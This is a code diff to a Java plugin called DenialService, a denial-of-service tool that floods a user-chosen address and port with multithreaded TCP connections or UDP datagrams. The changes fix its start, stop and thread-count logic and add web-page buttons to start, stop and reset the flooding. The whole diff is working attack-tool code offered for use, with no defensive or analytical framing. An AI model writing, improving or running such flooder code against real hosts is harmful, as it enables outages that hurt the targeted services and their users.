@@ -30,7 +30,6 @@ public class DenialService extends PluginBase implements KWindow {
 	private Integer threads;
 	private DosProtcol dosProtcol;
 	private Integer pause;
-//	private String rawText;
 	private Flooder flooder;
 
 	@Override
@@ -73,12 +72,11 @@ public class DenialService extends PluginBase implements KWindow {
 		case "clear": clearAll();
 			break;
 		case "stop":
-			if((this.flooder==null)||(this.flooder.isRunning())) {
+			if((flooder==null)||(!flooder.isRunning())) {
 				stdio.println("There is no flooding in progress");
 				return;
-			} else {
+			} else if (flooder.isRunning()) {
 				flooder.stop();
-				flooder = null;
 			}
 			break;
 		case "wizard": wizard(stdio, commandRunner);
@@ -117,7 +115,7 @@ public class DenialService extends PluginBase implements KWindow {
 						if((Stdio.parseInt(commands[2])>65535)||(Stdio.parseInt(commands[2])<1))
 							stdio.println("Invalid threads number");
 						else
-							this.targetPort = Stdio.parseInt(commands[2]);
+							this.threads = Stdio.parseInt(commands[2]);
 					} else {
 						stdio.println("Invalid threads number");
 					}
@@ -132,6 +130,10 @@ public class DenialService extends PluginBase implements KWindow {
 				default: stdio.println("Usage: Dos set (address|port|protocol|threads|pause) value");
 					break;
 				}
+			if(createCannon()!=null) {
+				this.flooder = createCannon();
+				stdio.println("Dos: System ready. Usage: Dos start");
+			}
 			break;
 		default: stdio.println(getHint());
 			break;
@@ -139,6 +141,8 @@ public class DenialService extends PluginBase implements KWindow {
 	}
 
 	private void clearAll() {
+		if((flooder!=null)&&(flooder.isRunning()))
+			flooder.stop();
 		this.flooder = null;
 		this.targetAddress = null;
 		this.targetPort = null;
@@ -255,19 +259,23 @@ public class DenialService extends PluginBase implements KWindow {
 				break;
 			}
 		}
-		
+
 		public void start() {
-			for (int i = 0; i < flooderInstance.length; i++) {
-				flooderInstance[i].start();
+			if(!this.isRunning()) {
+				for (int i = 0; i < flooderInstance.length; i++) {
+					flooderInstance[i].start();
+				}
 			}
 		}
 
 		public void stop() {
-			for (int i = 0; i < flooderInstance.length; i++) {
-				flooderInstance[i].interrupt();
+			if(this.isRunning()) {
+				for (int i = 0; i < flooderInstance.length; i++) {
+					flooderInstance[i].interrupt();
+				}
 			}
 		}
-		
+
 		public boolean isRunning() {
 			if(flooderInstance==null)
 				return false;
@@ -304,6 +312,7 @@ public class DenialService extends PluginBase implements KWindow {
 
 			@Override
 			public void run() {
+				this.setName("DoS Flooder (" + getProtocol() + "@" + targetAddress + ":" + port + ")");
 				Boolean running = true;
 				while(running) {
 					try {
@@ -320,7 +329,7 @@ public class DenialService extends PluginBase implements KWindow {
 			}
 
 			abstract void flood() throws UnknownHostException, IOException;
-			
+			abstract String getProtocol(); 
 		}
 		
 		public class TcpFlooder extends FlooderInstance {
@@ -335,6 +344,11 @@ public class DenialService extends PluginBase implements KWindow {
 				PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
 				printWriter.println(super.defaultString);
 				socket.close();
+			}
+			
+			@Override
+			String getProtocol() {
+				return "TCP";
 			}
 		}
 		
@@ -353,10 +367,40 @@ public class DenialService extends PluginBase implements KWindow {
 				datagramSocket.send(datagramPacket);
 				datagramSocket.close();
 			}
+
+			@Override
+			String getProtocol() {
+				return "UDP";
+			}
 		}
+	
 	}
 	
 	private void updateWindow(Window window) {
+		createCannon();
+		if(window.paramContainsKey("flooderstatus")) {
+			try {
+				if(window.paramGet("flooderstatus").equals("start")) {
+					if (flooder!=null) {
+						flooder.start();
+					}
+				} else if (window.paramGet("flooderstatus").equals("stop")) {
+					if (flooder!=null)
+						flooder.stop();
+				}
+			} catch (Exception e) {
+				window.setContent(new StringBuilder());
+				window.getContent().append("<h4>Error while performing action (" + window.paramGet("flooderstatus") + ")</h4>");
+				window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=reset\")'>Try DOS reset</button>");
+				return;
+			}
+			if (window.paramGet("flooderstatus").equals("reset")) {
+				clearAll();
+			}
+		}
+		try {
+			Thread.sleep(1000);
+		} catch (InterruptedException e) { }
 		window.setContent(new StringBuilder());
 		if(flooder!=null&&flooder.isRunning()) {
 			window.getContent().append("<h4>Flooder is running</h4>");
@@ -364,9 +408,13 @@ public class DenialService extends PluginBase implements KWindow {
 			window.getContent().append("Target port: " + this.targetPort + "<br/>");
 			window.getContent().append("Target protocol: " + this.dosProtcol + "<br/>");
 			window.getContent().append("Running treads: " + this.threads + "<br/>");
+			window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=stop\")'>Stop flooding</button>");
 		} else if(flooder!=null) {
 			window.getContent().append("<h4>No flooder is running</h4>");
-		} else {
+			window.getContent().append("Target: " + dosProtcol + "@" + targetAddress + ":" 
+					+ targetPort + " (" + pause + "ms~" + threads + " thead" + (threads==1 ? "" : "s") + ")" + "<br/>");
+			window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=start\")'>Start flooding</button>");
+		} else if (flooder==null){
 			window.getContent().append("<h4>No flooder is configured</h4>");
 		}
 	}
